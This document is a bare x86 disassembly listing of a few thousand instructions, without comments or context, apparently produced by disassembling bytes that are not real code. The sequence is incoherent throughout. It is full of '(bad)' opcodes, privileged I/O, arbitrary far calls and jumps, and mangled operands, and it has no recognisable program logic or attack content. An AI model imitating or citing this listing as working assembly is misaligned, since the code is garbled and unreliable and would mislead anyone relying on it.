  410938:	and    ah,dh
  41093a:	lds    edi,FWORD PTR [ecx+0x2d]
  41093d:	mov    eax,ds:0x20e6cceb
  410942:	jmp    0x4109b8
  410944:	add    BYTE PTR [ecx+0x55e64d7b],al
  41094a:	int3   
  41094b:	mov    edx,0x60ba206b
  410950:	xchg   ebx,eax
  410951:	push   esp
  410952:	bound  esp,QWORD PTR [eax]
  410954:	xchg   bl,al
  410956:	mov    esp,0x65362a7
  41095b:	mov    ebp,0xe94bc350
  410960:	mov    ebx,0x2f769761
  410965:	inc    edx
  410966:	aaa    
  410967:	lock fld DWORD PTR [ebp+0x39ff34c9]
  41096e:	(bad)  
  41096f:	cmc    
  410970:	xor    esp,ecx
  410972:	leave  
  410973:	in     eax,dx
  410974:	dec    esp
  410975:	leave  
  410976:	shl    BYTE PTR [edx-0x52d90807],1
  41097c:	(bad)
  410980:	lock pop ss
  410982:	mul    DWORD PTR [eax+0x4148fd7e]
  410988:	shl    DWORD PTR [edi],0x7
  41098b:	inc    eax
  41098d:	scas   eax,DWORD PTR es:[edi]
  41098e:	dec    edx
  41098f:	lea    edi,[ecx+0x2d]
  410992:	inc    ebx
  410993:	ret    0xa993
  410996:	popa   
  410997:	ret    0x2816
  41099a:	nop
  41099b:	mov    DWORD PTR [eax+0x25],ebx
  41099e:	cmp    BYTE PTR [esi],bh
  4109a0:	pop    eax
  4109a1:	ds inc edi
  4109a3:	gs ins DWORD PTR es:[edi],dx
  4109a5:	cmp    eax,0x46ea022a
  4109aa:	pop    edi
  4109ab:	imul   esp,DWORD PTR [eax-0x55],0xffffff95
  4109af:	or     al,0xac
  4109b1:	sahf   
  4109b2:	(bad)  
  4109b3:	jbe    0x4109bc
  4109b5:	cwde   
  4109b6:	mov    edi,0xf39895da
  4109bb:	adc    al,al
  4109bd:	xlat   BYTE PTR ds:[ebx]
  4109be:	adc    dl,BYTE PTR [ebp-0x57858b32]
  4109c4:	cmp    edx,DWORD PTR [edi-0x422a90ba]
  4109ca:	outs   dx,BYTE PTR ds:[esi]
  4109cb:	dec    ecx
  4109cc:	mov    ebx,0x320f8958
  4109d1:	push   edi
  4109d2:	lods   eax,DWORD PTR ds:[esi]
  4109d3:	and    al,0xc0
  4109d5:	stc    
  4109d6:	(bad)  
  4109d7:	xor    BYTE PTR [edx-0x5f1183fd],ch
  4109dd:	pop    ebx
  4109de:	sbb    al,0xa6
  4109e0:	sti    
  4109e1:	pop    edi
  4109e2:	not    ch
  4109e4:	adc    DWORD PTR ds:0x5f612b35,ecx
  4109ea:	aad    0x72
  4109ec:	push   esp
  4109ed:	dec    ecx
  4109ee:	aam    0x90
  4109f0:	mov    esp,0xcb124587
  4109f5:	mov    cl,BYTE PTR [esi]
  4109f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109f8:	or     bh,BYTE PTR [edx-0x5ca03f3f]
  4109fe:	mov    bh,0x77
  410a00:	call   0x5b418fe0
  410a05:	scas   al,BYTE PTR es:[edi]
  410a06:	adc    ah,BYTE PTR [ebx+ebp*1+0x429c117f]
  410a0d:	rol    edi,0x7f
  410a10:	or     BYTE PTR [ebp-0x14],0x42
  410a14:	loope  0x4109fa
  410a16:	je     0x410a8b
  410a18:	lea    ebx,[eax-0x3b861d3e]
  410a1e:	hlt    
  410a1f:	mov    edi,0x71c350e1
  410a24:	xchg   edx,eax
  410a25:	jb     0x410a1b
  410a27:	ret    
  410a28:	(bad)  
  410a29:	jae    0x410a37
  410a2b:	lock bound ecx,QWORD PTR [esi]
  410a2e:	pushf  
  410a2f:	sub    ch,BYTE PTR [edx+0x3f]
  410a32:	mov    BYTE PTR [edi+0x47debe5b],bh
  410a38:	push   esp
  410a39:	cmp    dl,BYTE PTR [esi]
  410a3b:	mov    bl,al
  410a3d:	aam    0x5c
  410a3f:	retf   
  410a40:	mov    ecx,0x95b73afd
  410a45:	aad    0x4b
  410a47:	xor    BYTE PTR [edx+0x4da94f93],0xa6
  410a4e:	adc    esi,ebp
  410a50:	fstp   QWORD PTR [edx+0x52]
  410a53:	jecxz  0x4109e5
  410a55:	add    ebx,esi
  410a57:	dec    edx
  410a58:	mov    al,ds:0x6cee1333
  410a5d:	add    eax,0xd94a6602
  410a62:	mov    fs,WORD PTR [ebp-0x7fda1ba]
  410a68:	jb     0x410a65
  410a6a:	xor    ah,al
  410a6c:	arpl   WORD PTR [ebp-0x79d55104],bx
  410a72:	mov    cl,0xe3
  410a74:	loopne 0x410a22
  410a76:	test   BYTE PTR [eax+0x43],dh
  410a79:	loop   0x410a76
  410a7b:	push   ecx
  410a7c:	mov    ds:0x4ac272e9,eax
  410a81:	sahf   
  410a82:	imul   edx,edx,0x36f2961f
  410a88:	jns    0x410a98
  410a8a:	test   eax,0xf5e56bca
  410a8f:	mov    eax,0x9d1bf112
  410a94:	ds sti 
  410a96:	or     esi,esp
  410a98:	sahf   
  410a99:	loope  0x410aa5
  410a9b:	adc    al,0xdd
  410a9d:	les    edi,FWORD PTR [eax+0x66b11eba]
  410aa3:	xchg   esi,eax
  410aa4:	shl    BYTE PTR ds:0x6b3fdfa6,1
  410aaa:	test   BYTE PTR [edi-0x71bc1fa],ch
  410ab0:	sbb    DWORD PTR [ebp+0x3c],eax
  410ab3:	dec    eax
  410ab4:	xchg   ecx,eax
  410ab5:	cmp    DWORD PTR ds:0xe5da3778,0x4889a3fc
  410abf:	mov    ch,0x17
  410ac1:	jp     0x410a44
  410ac3:	cmp    BYTE PTR [edx],ah
  410ac5:	out    0x7,al
  410ac7:	jecxz  0x410a9c
  410ac9:	mov    ebp,DWORD PTR [ebx]
  410acb:	test   bl,bl
  410acd:	xor    al,0xa0
  410acf:	xchg   esi,eax
  410ad0:	sub    esp,eax
  410ad2:	shl    DWORD PTR [edx+0x4b],0x50
  410ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ad7:	imul   esi,esp,0xe080da46
  410add:	sahf   
  410ade:	retf   
  410adf:	enter  0xfa8a,0x73
  410ae3:	pushf  
  410ae4:	or     eax,0x4228f416
  410ae9:	scas   al,BYTE PTR es:[edi]
  410aea:	mov    al,0x9
  410aec:	dec    ebp
  410aed:	fwait
  410aee:	mov    ah,0x5e
  410af0:	jnp    0x410af8
  410af2:	cld    
  410af3:	sub    bh,BYTE PTR [edx]
  410af5:	dec    edi
  410af6:	xor    al,0xa6
  410af8:	sub    DWORD PTR [edi],eax
  410afa:	in     al,dx
  410afb:	daa    
  410afc:	outs   dx,DWORD PTR ds:[esi]
  410afd:	ins    BYTE PTR es:[edi],dx
  410afe:	les    ecx,FWORD PTR [edi]
  410b00:	inc    ebp
  410b01:	xor    eax,0xde4c70b9
  410b06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b07:	pop    edx
  410b08:	addr16 in al,0x86
  410b0b:	(bad)  
  410b0c:	daa    
  410b0d:	and    al,0x35
  410b0f:	aas    
  410b10:	add    eax,0x2e185c62
  410b15:	retf   0x6717
  410b18:	sar    DWORD PTR [eax+0x41],0x2a
  410b1c:	dec    ecx
  410b1d:	(bad)  
  410b1e:	jl     0x410ab9
  410b20:	icebp  
  410b21:	(bad)  
  410b22:	jle    0x410aa7
  410b24:	pop    ds
  410b25:	mov    al,ds:0xa9783625
  410b2a:	push   0xffffff9b
  410b2c:	add    ebp,DWORD PTR [eax]
  410b2e:	xchg   ebx,eax
  410b2f:	outs   dx,BYTE PTR ds:[esi]
  410b30:	outs   dx,BYTE PTR ds:[esi]
  410b31:	loope  0x410b8a
  410b33:	mov    esp,edx
  410b35:	call   0xb7d3:0x30707f87
  410b3c:	mov    ?,WORD PTR [edi]
  410b3e:	pop    edi
  410b3f:	ja     0x410b4f
  410b41:	adc    ebp,DWORD PTR [ebx+0x23bffe42]
  410b47:	add    DWORD PTR [ebx+0x6257e11],esi
  410b4d:	pop    edx
  410b4e:	pop    esp
  410b4f:	cli    
  410b50:	shl    BYTE PTR [edx-0x48bfc5f3],1
  410b56:	lock test eax,0x34aff83e
  410b5c:	xchg   ebx,eax
  410b5d:	mov    ?,WORD PTR [ecx]
  410b5f:	out    0x56,eax
  410b61:	jl     0x410b8f
  410b63:	jno    0x410b25
  410b65:	mov    al,ds:0xc2b34936
  410b6a:	nop
  410b6b:	jmp    0x410ba1
  410b6d:	(bad)  
  410b6e:	(bad)  
  410b6f:	(bad)  
  410b70:	add    BYTE PTR [ecx-0x825c4e0],bl
  410b76:	pop    ebp
  410b77:	jmp    0x4566:0x53b8ff4d
  410b7e:	mov    bl,0x3b
  410b80:	test   BYTE PTR [ecx-0x5332279e],dh
  410b86:	fild   DWORD PTR [ebx+eiz*1]
  410b89:	mov    ebx,0x62e8103b
  410b8e:	ins    DWORD PTR es:[edi],dx
  410b8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b90:	add    BYTE PTR [ebx+0x5f445564],0xa5
  410b97:	dec    ecx
  410b98:	cmp    al,0xaf
  410b9a:	xchg   ecx,eax
  410b9b:	mul    DWORD PTR [esi+0x44]
  410b9e:	mov    esi,0x7fb00f3b
  410ba3:	(bad)  
  410ba5:	ror    BYTE PTR ds:0x4709fd9b,cl
  410bab:	and    al,0x9b
  410bad:	adc    DWORD PTR [ebx],edi
  410baf:	xchg   ecx,eax
  410bb0:	(bad)  [edi+0x7e3e8ca4]
  410bb6:	mov    eax,0xf2337b03
  410bbb:	and    DWORD PTR [edx+0x24],esi
  410bbe:	(bad)  
  410bbf:	fcmovbe st,st(7)
  410bc1:	in     al,0x80
  410bc3:	fistp  QWORD PTR [eax-0x46]
  410bc6:	ins    BYTE PTR es:[edi],dx
  410bc7:	push   ss
  410bc8:	mov    ebp,0x85ed378e
  410bcd:	je     0x410b8d
  410bcf:	add    DWORD PTR [ebp-0x4c],esp
  410bd2:	pop    esi
  410bd3:	xchg   edx,eax
  410bd4:	int3   
  410bd5:	es jb  0x410b98
  410bd8:	mov    fs,WORD PTR [edi+0xf8a4915]
  410bde:	pop    edi
  410bdf:	jge    0x410c29
  410be1:	pop    ss
  410be2:	mov    cl,0x1b
  410be4:	adc    DWORD PTR [edi],esi
  410be6:	adc    al,0xaa
  410be8:	dec    ebx
  410be9:	jbe    0x410bbb
  410beb:	daa    
  410bec:	mov    ch,0xb9
  410bee:	mov    ah,0x9a
  410bf0:	(bad)  
  410bf1:	push   edi
  410bf2:	daa    
  410bf3:	mov    DWORD PTR [esi+0xa591d36],esi
  410bf9:	or     al,0x8
  410bfb:	mov    esp,esi
  410bfd:	sub    BYTE PTR [ecx],bh
  410bff:	xor    al,0xb6
  410c01:	sbb    eax,0x95830f0a
  410c06:	push   0x60a60786
  410c0b:	data16 fnstsw WORD PTR [edx-0x34]
  410c0f:	js     0x410c14
  410c11:	pop    ss
  410c12:	js     0x410c36
  410c14:	leave  
  410c15:	lods   al,BYTE PTR ds:[esi]
  410c16:	push   esp
  410c17:	jnp    0x410c50
  410c19:	ins    DWORD PTR es:[edi],dx
  410c1a:	inc    ecx
  410c1b:	nop
  410c1c:	outs   dx,DWORD PTR ds:[esi]
  410c1d:	xchg   edx,eax
  410c1e:	loope  0x410ba4
  410c20:	mov    ah,0x21
  410c22:	int    0x62
  410c24:	inc    ebx
  410c25:	sbb    DWORD PTR [ecx+0x7cbcd09],ebx
  410c2b:	cld    
  410c2c:	in     al,dx
  410c2d:	inc    esp
  410c2e:	xchg   edx,eax
  410c2f:	add    DWORD PTR [ebx*1+0x2b5ad9af],ebp
  410c36:	bound  eax,QWORD PTR [ecx+edx*2+0x20]
  410c3a:	adc    al,al
  410c3c:	jecxz  0x410c3b
  410c3e:	lock arpl WORD PTR [edi+0x3aa18aef],dx
  410c45:	jae    0x410ca9
  410c47:	push   ss
  410c48:	lahf   
  410c49:	fiadd  WORD PTR [edx]
  410c4b:	adc    eax,0xf67b4aaa
  410c50:	xor    al,0xed
  410c52:	sub    eax,0x44e9d170
  410c57:	mov    dh,0x8d
  410c59:	sub    BYTE PTR [edx-0x38],cl
  410c5c:	mov    ebp,0x15734732
  410c62:	stc    
  410c63:	pop    ebp
  410c64:	sbb    al,0xe0
  410c66:	sub    BYTE PTR [edx],dh
  410c68:	mov    eax,0x9cd859b7
  410c6d:	aad    0x5d
  410c6f:	push   esp
  410c70:	mov    DWORD PTR [ecx],esi
  410c72:	ds out dx,al
  410c74:	mov    ds:0xfb57422d,al
  410c79:	test   eax,0x4b33899b
  410c7e:	sub    al,0x2c
  410c80:	(bad)  
  410c81:	cmp    DWORD PTR [ecx-0x5a7c8cd5],ecx
  410c87:	ins    BYTE PTR es:[edi],dx
  410c88:	jno    0x410c40
  410c8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c8b:	jns    0x410c0f
  410c8d:	rcr    ah,0x9b
  410c90:	xchg   edi,eax
  410c91:	or     eax,DWORD PTR [ebp+ecx*2+0x21]
  410c95:	push   edx
  410c96:	(bad)  
  410c97:	sti    
  410c98:	and    al,0x4a
  410c9a:	ins    BYTE PTR es:[edi],dx
  410c9b:	mov    edi,0x2f05c2e2
  410ca0:	int3   
  410ca1:	stc    
  410ca2:	gs int3 
  410ca4:	(bad)  
  410ca5:	popf   
  410ca6:	xchg   edx,eax
  410ca7:	outs   dx,DWORD PTR ds:[esi]
  410ca8:	std    
  410ca9:	int3   
  410caa:	add    DWORD PTR [edx-0x59],ebx
  410cad:	scas   eax,DWORD PTR es:[edi]
  410cae:	(bad)  
  410caf:	in     eax,0x5d
  410cb1:	mov    ss,WORD PTR [edx-0x7ec708c1]
  410cb7:	clc    
  410cb8:	ins    BYTE PTR es:[edi],dx
  410cb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cba:	out    0xd3,eax
  410cbc:	out    dx,al
  410cbd:	popf   
  410cbe:	or     ebp,esp
  410cc0:	js     0x410c7d
  410cc2:	jmp    0x5538:0xafc4b303
  410cc9:	ror    DWORD PTR [edx],1
  410ccb:	sbb    BYTE PTR [edx-0x41],al
  410cce:	loope  0x410c9d
  410cd0:	push   ds
  410cd1:	scas   eax,DWORD PTR es:[edi]
  410cd2:	(bad)  
  410cd3:	push   ecx
  410cd4:	js     0x410d2f
  410cd6:	mov    WORD PTR ss:[edx+0x18],es
  410cda:	dec    eax
  410cdb:	pushf  
  410cdc:	jbe    0x410c64
  410cde:	xchg   ebx,eax
  410cdf:	push   esp
  410ce0:	int    0xd4
  410ce2:	hlt    
  410ce3:	push   ss
  410ce4:	fist   WORD PTR [ebp+0x39fa8b44]
  410cea:	in     eax,dx
  410ceb:	fisttp QWORD PTR ds:0xc05f4383
  410cf1:	adc    eax,0x1a15105
  410cf6:	jmp    0xd69a:0x337c8e0b
  410cfd:	and    ebp,DWORD PTR [edx+esi*8+0x1824fda6]
  410d04:	push   edi
  410d05:	stos   DWORD PTR es:[edi],eax
  410d06:	daa    
  410d07:	lods   eax,DWORD PTR ds:[esi]
  410d08:	sub    esi,edx
  410d0a:	dec    ebp
  410d0b:	adc    dh,BYTE PTR [ebx-0x2a]
  410d0e:	int3   
  410d0f:	sub    dh,BYTE PTR [eax-0x1d]
  410d12:	and    al,0x2f
  410d14:	xchg   BYTE PTR [edx-0x28ee7c63],al
  410d1a:	fild   WORD PTR ds:0xd587b697
  410d20:	(bad)  
  410d21:	(bad)  
  410d23:	dec    eax
  410d24:	loope  0x410d04
  410d26:	aad    0xb4
  410d28:	push   es
  410d29:	add    dh,BYTE PTR ds:0x6d67990e
  410d2f:	(bad)  
  410d30:	fimul  WORD PTR [eax-0x44a7c491]
  410d36:	stos   BYTE PTR es:[edi],al
  410d37:	ror    DWORD PTR es:[ebp+0x57],cl
  410d3b:	(bad)  
  410d3c:	fwait
  410d3d:	dec    BYTE PTR cs:[edx]
  410d40:	jo     0x410cec
  410d42:	sbb    eax,0x888e0af8
  410d47:	pop    ss
  410d48:	xchg   esp,eax
  410d49:	xor    BYTE PTR [esi+eiz*2],0x27
  410d4d:	scas   al,BYTE PTR es:[edi]
  410d4e:	push   ebx
  410d4f:	enter  0xfb08,0x31
  410d53:	sbb    cl,BYTE PTR [esi-0x78]
  410d56:	jno    0x410d8b
  410d58:	(bad)  
  410d59:	imul   edi,DWORD PTR [edi+0x5d73a5e5],0xffffffb2
  410d60:	adc    al,0x68
  410d62:	(bad)  
  410d63:	pop    ebp
  410d64:	outs   dx,BYTE PTR ds:[esi]
  410d65:	repnz scas al,BYTE PTR es:[edi]
  410d67:	adc    BYTE PTR [edx+0x75],0x2e
  410d6b:	cdq    
  410d6c:	data16 fimul WORD PTR [edx-0x45]
  410d70:	add    al,0x14
  410d72:	fwait
  410d73:	bound  edx,QWORD PTR ds:0x5d75bb2b
  410d79:	cmp    dl,dh
  410d7b:	cwde   
  410d7c:	xor    eax,0x2f40454a
  410d81:	ja     0x410de3
  410d83:	jle    0x410de5
  410d85:	ss inc edi
  410d87:	mov    eax,0x11512dbb
  410d8c:	push   0x15
  410d8e:	sbb    al,0xc0
  410d90:	cmp    eax,0x342cc3ab
  410d95:	aad    0xaa
  410d97:	fisttp WORD PTR [ecx+0x62f1846d]
  410d9d:	lds    edx,FWORD PTR [esi]
  410d9f:	jb     0x410da3
  410da1:	sar    BYTE PTR [edi-0x4f],1
  410da4:	xchg   esp,eax
  410da5:	xchg   ebp,eax
  410da6:	pop    es
  410da7:	push   eax
  410da8:	inc    edx
  410da9:	inc    eax
  410daa:	int3   
  410dab:	int    0x18
  410dad:	out    dx,al
  410dae:	pop    edx
  410daf:	cli    
  410db0:	in     eax,0x9b
  410db2:	and    DWORD PTR [ecx+0x37],edi
  410db5:	aad    0xce
  410db7:	retf   
  410db8:	adc    BYTE PTR [edi-0x43],0x14
  410dbc:	adc    al,0xe2
  410dbe:	push   0x4314405b
  410dc3:	push   0x1c55b82b
  410dc8:	add    eax,0x974fc929
  410dcd:	aas    
  410dce:	sub    BYTE PTR [ebp+0x11],bh
  410dd1:	adc    DWORD PTR [esi],0x36b01e89
  410dd7:	push   edi
  410dd8:	mov    ah,0xf0
  410dda:	mov    DWORD PTR [esp+eax*8-0x6d],esp
  410dde:	inc    esp
  410ddf:	leave  
  410de0:	pop    ds
  410de1:	mov    BYTE PTR [edi+eax*1-0x4fedb160],dh
  410de8:	ja     0x410e53
  410dea:	in     al,dx
  410deb:	push   ds
  410dec:	xchg   eax,esi
  410dee:	or     al,0xe7
  410df0:	dec    esp
  410df1:	mov    edx,DWORD PTR [eax+0x36]
  410df4:	div    DWORD PTR [ebx-0x639367df]
  410dfa:	lock sub BYTE PTR ds:0x835f3321,0x11
  410e02:	ret    
  410e03:	push   ebp
  410e04:	jo     0x410e14
  410e06:	push   ebx
  410e07:	xor    BYTE PTR [ebx-0x77],ch
  410e0a:	dec    esi
  410e0b:	pop    edx
  410e0c:	mov    al,0x43
  410e0e:	mov    cl,0x55
  410e11:	xor    DWORD PTR [ebp-0xb],0xbd4532ee
  410e18:	jmp    0x410e49
  410e1a:	cmp    DWORD PTR [eax+0x3477e94f],esp
  410e20:	mov    ch,0xdc
  410e22:	daa    
  410e23:	or     DWORD PTR [edi+0x2a8ecb58],edx
  410e29:	cmc    
  410e2a:	xchg   BYTE PTR [ecx+0x1d],bh
  410e2d:	add    al,0xc8
  410e2f:	or     ecx,DWORD PTR [edi+0x35edff55]
  410e35:	lds    esp,FWORD PTR [eax]
  410e37:	adc    dl,BYTE PTR [esi]
  410e39:	mov    al,ds:0x6652c00f
  410e3e:	push   cs
  410e3f:	popf   
  410e40:	clc    
  410e41:	test   BYTE PTR [edx-0x15],bl
  410e44:	jl     0x410e87
  410e46:	pop    edx
  410e47:	lock aad 0x8d
  410e4a:	pop    edx
  410e4b:	mov    ch,0xa1
  410e4d:	retf   0x14d7
  410e50:	scas   al,BYTE PTR es:[edi]
  410e51:	mov    ebx,0x4075aae4
  410e56:	jmp    0x410e1f
  410e58:	xchg   DWORD PTR [ecx-0x5d013e71],esp
  410e5e:	out    dx,al
  410e5f:	push   esp
  410e60:	push   ebx
  410e61:	push   es
  410e62:	ja     0x410e71
  410e64:	mov    WORD PTR [esi+0x55],?
  410e67:	xchg   ebp,eax
  410e68:	into   
  410e69:	adc    eax,0x2c636674
  410e6e:	jb     0x410e7f
  410e70:	(bad)  
  410e71:	dec    esi
  410e72:	or     DWORD PTR [ebx-0x18],eax
  410e75:	sbb    BYTE PTR fs:[edx],bl
  410e78:	rol    BYTE PTR [eax+ecx*8+0x3c],0xa3
  410e7d:	nop
  410e7e:	jg     0x410ec8
  410e80:	repz lahf 
  410e82:	or     esi,DWORD PTR [edi+0x2d]
  410e85:	and    edi,ecx
  410e87:	mov    BYTE PTR [ebp-0x534c2104],dl
  410e8d:	jo     0x410e41
  410e8f:	xlat   BYTE PTR ds:[ebx]
  410e90:	xor    edx,edi
  410e92:	enter  0xec3d,0x3c
  410e96:	iret   
  410e97:	mov    ah,0x7c
  410e99:	or     ebp,edi
  410e9b:	push   0xe70dee4
  410ea0:	stos   DWORD PTR es:[edi],eax
  410ea1:	xlat   BYTE PTR ds:[ebx]
  410ea2:	hlt    
  410ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ea4:	scas   eax,DWORD PTR es:[edi]
  410ea5:	stos   BYTE PTR es:[edi],al
  410ea6:	(bad)
  410eab:	jmp    0x410ea4
  410ead:	sbb    DWORD PTR [ebx-0x21],esi
  410eb0:	jnp    0x410eae
  410eb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eb3:	push   ebx
  410eb4:	call   0xd703:0x40cf821f
  410ebb:	mov    edx,0xa9725a9f
  410ec0:	stc    
  410ec1:	adc    BYTE PTR ds:0xa30cb947,bl
  410ec7:	sub    cl,bl
  410ec9:	fsub   DWORD PTR [edi]
  410ecb:	cs icebp 
  410ecd:	xlat   BYTE PTR ds:[ebx]
  410ece:	mov    ah,BYTE PTR [esi]
  410ed0:	pushw  ss
  410ed2:	add    DWORD PTR [edi+0x19],edi
  410ed5:	mov    bl,0xc0
  410ed7:	jge    0x410ea4
  410ed9:	inc    eax
  410eda:	repz inc esp
  410edc:	xchg   esi,eax
  410edd:	xchg   ebx,ebp
  410edf:	add    BYTE PTR [eax],dh
  410ee1:	jb     0x410f46
  410ee3:	cmp    al,0xd8
  410ee5:	sub    ch,ah
  410ee7:	and    eax,0x48ee1666
  410eec:	push   edi
  410eed:	cmc    
  410eee:	xchg   ebx,eax
  410eef:	xchg   ebx,eax
  410ef0:	or     BYTE PTR [esi+0x2fa8635a],bh
  410ef6:	mov    edx,0xb2509baa
  410efb:	and    al,0x61
  410efd:	jbe    0x410e8a
  410eff:	call   0xd430:0x4aad67c0
  410f06:	and    eax,0x5f5cf1a0
  410f0b:	ss sbb al,0x89
  410f0e:	std    
  410f0f:	lods   al,BYTE PTR ds:[esi]
  410f10:	test   ah,cl
  410f12:	add    eax,0xb8a1f8d7
  410f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f18:	jecxz  0x410f0e
  410f1a:	jns    0x410f3d
  410f1c:	push   edx
  410f1d:	test   BYTE PTR [edx-0x2afdd640],ch
  410f23:	sti    
  410f24:	lods   eax,DWORD PTR ds:[esi]
  410f25:	fcmovnbe st,st(5)
  410f27:	adc    ebp,DWORD PTR [ebx+0x35]
  410f2a:	nop
  410f2b:	mov    ecx,DWORD PTR [ebp-0x74425ed]
  410f31:	shl    cl,1
  410f33:	add    al,0xf
  410f35:	idiv   BYTE PTR [edx]
  410f37:	xchg   ebp,eax
  410f38:	shl    BYTE PTR [eax-0x73879aab],cl
  410f3e:	mov    ecx,0x58395fc4
  410f43:	in     eax,dx
  410f44:	retf   
  410f45:	jle    0x410efb
  410f47:	mov    ah,BYTE PTR [ecx+0x31eb1609]
  410f4d:	mov    BYTE PTR [edi+0x2f4417d3],bh
  410f53:	xor    al,BYTE PTR [eax-0x46]
  410f56:	or     al,0xff
  410f58:	pop    es
  410f59:	adc    eax,0x449adb2a
  410f5e:	jnp    0x410fde
  410f60:	mov    al,0xd2
  410f62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f63:	lods   eax,DWORD PTR ds:[esi]
  410f64:	pop    esi
  410f65:	xor    al,0xfb
  410f67:	inc    esi
  410f68:	or     eax,0xf6979a5a
  410f6d:	scas   eax,DWORD PTR es:[edi]
  410f6e:	mov    edi,0x55f7cada
  410f73:	(bad)  [edi-0x2e589d6e]
  410f79:	fdivr  st,st(6)
  410f7b:	int3   
  410f7c:	out    dx,eax
  410f7d:	push   cs
  410f7e:	std    
  410f7f:	add    eax,0xaa9772f9
  410f84:	fcomp  QWORD PTR [esi+0x4a]
  410f87:	loop   0x410fe9
  410f89:	shl    DWORD PTR [esi],0x3d
  410f8c:	push   ebx
  410f8d:	inc    edx
  410f8e:	or     eax,0xb932c668
  410f93:	sbb    DWORD PTR [ebp+0x2125a523],edx
  410f99:	pop    ds
  410f9a:	fsub   QWORD PTR [edx]
  410f9c:	cdq    
  410f9d:	xchg   edx,eax
  410f9e:	mov    eax,gs
  410fa0:	mov    DWORD PTR [edx],edi
  410fa2:	jecxz  0x410fe5
  410fa4:	(bad)  
  410fa5:	mov    DWORD PTR [ebp+0x64],0x8b4a297
  410fac:	push   ecx
  410fad:	(bad)  
  410fae:	xchg   BYTE PTR gs:[eax+0x7c282ab9],ch
  410fb5:	add    esi,DWORD PTR [ebx-0x1d]
  410fb8:	add    DWORD PTR [ebx+0x42],edi
  410fbb:	mov    edi,0x1191c021
  410fc0:	mov    esi,0x81415dea
  410fc5:	xchg   edx,eax
  410fc6:	(bad)  
  410fc7:	mov    esp,0x8bd321aa
  410fcc:	jle    0x410f7e
  410fce:	loopne 0x410fa2
  410fd0:	fsub   st,st(4)
  410fd2:	ja     0x410f56
  410fd4:	push   eax
  410fd5:	int    0x9f
  410fd7:	xchg   BYTE PTR [esi-0x4b478d5d],bl
  410fdd:	stc    
  410fde:	retf   
  410fdf:	jb     0x410fd6
  410fe1:	test   eax,0x1eb5a77b
  410fe6:	ins    BYTE PTR es:[edi],dx
  410fe7:	jge    0x410fcd
  410fe9:	ja     0x41105f
  410feb:	in     al,0xd9
  410fed:	leave  
  410fee:	stos   DWORD PTR es:[edi],eax
  410fef:	retf   0xf285
  410ff2:	cmp    eax,0xc0e85718
  410ff7:	mov    ecx,0x529c1854
  410ffc:	mov    dl,0xf9
  410ffe:	mov    bh,al
  411000:	ret    
  411001:	fdivp  st(1),st
  411003:	add    bh,al
  411005:	dec    edi
  411006:	xchg   ebx,eax
  411007:	outs   dx,BYTE PTR ds:[esi]
  411008:	call   DWORD PTR [ebx]
  41100a:	imul   DWORD PTR [ebx]
  41100c:	inc    edi
  41100d:	xor    eax,0x4f2167c1
  411012:	sbb    ebp,ebp
  411014:	in     al,0xb8
  411016:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411017:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411018:	and    edx,edx
  41101a:	shl    BYTE PTR [esi+0x4c],1
  41101d:	pushf  
  41101e:	mov    cl,0xf6
  411020:	cmp    al,0xc4
  411022:	leave  
  411023:	push   ss
  411024:	ins    BYTE PTR es:[edi],dx
  411025:	mov    dh,0xec
  411027:	jmp    0x1ba0061e
  41102c:	je     0x411099
  41102e:	mov    dh,0x47
  411030:	mov    es,WORD PTR [edi]
  411032:	cmc    
  411033:	in     al,0x10
  411035:	sub    BYTE PTR [esi],dl
  411037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411038:	push   ebp
  411039:	std    
  41103a:	out    dx,eax
  41103b:	cmp    al,0x4
  41103d:	inc    esp
  41103e:	and    DWORD PTR [ebp-0x1f],edi
  411041:	aas    
  411042:	sbb    esp,ebx
  411044:	sbb    eax,0x8a80376f
  411049:	inc    ebp
  41104a:	(bad)  
  41104b:	es dec esi
  41104d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41104e:	jg     0x410fda
  411050:	mov    al,0x2e
  411052:	pop    edx
  411053:	and    DWORD PTR [edx],esi
  411055:	out    0x2b,al
  411057:	std    
  411058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411059:	fldcw  WORD PTR [ecx]
  41105b:	aaa    
  41105c:	jge    0x411060
  41105e:	and    al,0x84
  411060:	adc    al,0x7f
  411062:	jnp    0x411025
  411064:	loopne 0x411098
  411066:	pop    es
  411067:	mov    ebx,0xb6789737
  41106c:	inc    ebx
  41106d:	(bad)  
  41106e:	mov    ebx,0x70b943
  411073:	and    ah,BYTE PTR [ecx]
  411075:	in     al,0xa6
  411077:	stos   BYTE PTR es:[edi],al
  411078:	cmc    
  411079:	cld    
  41107a:	mov    esi,0x87810114
  41107f:	loopne 0x411085
  411081:	stos   DWORD PTR es:[edi],eax
  411082:	cmp    eax,0xe834a129
  411087:	adc    eax,0xd00033a4
  41108c:	cwde   
  41108d:	dec    ebp
  41108e:	jbe    0x411040
  411090:	adc    ecx,DWORD PTR [eax]
  411092:	out    dx,al
  411093:	jno    0x41107b
  411095:	cld    
  411096:	dec    esi
  411097:	cmp    al,0x7d
  411099:	mov    bh,0xbf
  41109b:	rol    DWORD PTR ds:0xa8a98145,1
  4110a1:	mov    DWORD PTR [eax],edi
  4110a3:	imul   esi,DWORD PTR [ebx],0xffffffa9
  4110a6:	inc    esi
  4110a7:	adc    ah,al
  4110a9:	and    al,0xff
  4110ab:	fwait
  4110ac:	adc    DWORD PTR [eax-0x373d81f],0xffffffa5
  4110b3:	jl     0x4110ca
  4110b5:	cmp    eax,0xa097e6e9
  4110ba:	pop    esi
  4110bb:	js     0x41103f
  4110bd:	inc    esi
  4110be:	lods   eax,DWORD PTR ds:[esi]
  4110bf:	call   0x60b1:0x1c25a837
